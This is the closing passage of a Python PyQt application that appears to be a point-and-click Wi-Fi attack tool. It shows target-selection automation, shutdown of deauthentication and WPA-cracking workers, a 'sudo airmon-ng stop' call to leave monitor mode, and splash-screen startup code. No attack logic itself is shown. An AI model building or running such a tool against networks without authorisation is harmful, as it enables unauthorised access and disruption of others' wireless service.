            self.log("[⚡ Auto] Scan ended early — moving to target selection.")
            self.automation_phase = "waiting_selection"
            self._set_automation_status("🎯 Click a target row to proceed", GOLD)
            self._set_automation_progress_signal(
                "Phase: click a network row in the table to select the target…")

    def closeEvent(self, event: QCloseEvent):
        self.log("[*] Application closing...")
        self.is_closing = True
        try:
            self.automation_enabled = False
            if self.automation_poll_timer: self.automation_poll_timer.stop()
        except Exception: pass
        for r in (self.realtime_scan, self.targeted_scan,
                  self.deauth_attack, self.crack_attack):
            try: r.stop()
            except Exception: pass
        self.refresh_timer.stop(); self.handshake_timer.stop()
        for dlg in list(self._dialogs):
            try: dlg.close()
            except Exception: pass
        self._dialogs.clear()
        if self.monitor_interface:
            try:
                subprocess.run(["sudo", "airmon-ng", "stop", self.monitor_interface],
                               capture_output=True, text=True, timeout=10,
                               start_new_session=True)
            except Exception: pass
        self.log("[*] Cleanup complete. Farewell, warrior.")
        self.cleanup_complete = True
        event.accept()
def main():
    def geh(exc_type, exc_value, tb):
        print(f"Unhandled exception: {exc_type} - {exc_value}")
        import traceback; traceback.print_exception(exc_type, exc_value, tb)
    sys.excepthook = geh

    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    app.setApplicationName(APP_NAME)
    app.setApplicationDisplayName(APP_NAME)
    app.setApplicationVersion(APP_VERSION)
    splash = BTSSplashScreen()
    splash.show()
    app.processEvents()
    try:
        window = MainWindow()
    except Exception as e:
        splash.close()
        print(f"Error creating main window: {e}")
        import traceback; traceback.print_exc()
        return 0
    def show_main():
        try:
            splash.finish(window)
            window.show()
        except Exception as e:
            print(f"Error showing main window: {e}")
            try: window.show()
            except Exception: pass

    QTimer.singleShot(2500, show_main)

    try:
        return app.exec_()
    except KeyboardInterrupt:
        print("\n[!] Ctrl+C, exiting..."); return 0


if __name__ == "__main__":
    sys.exit(main())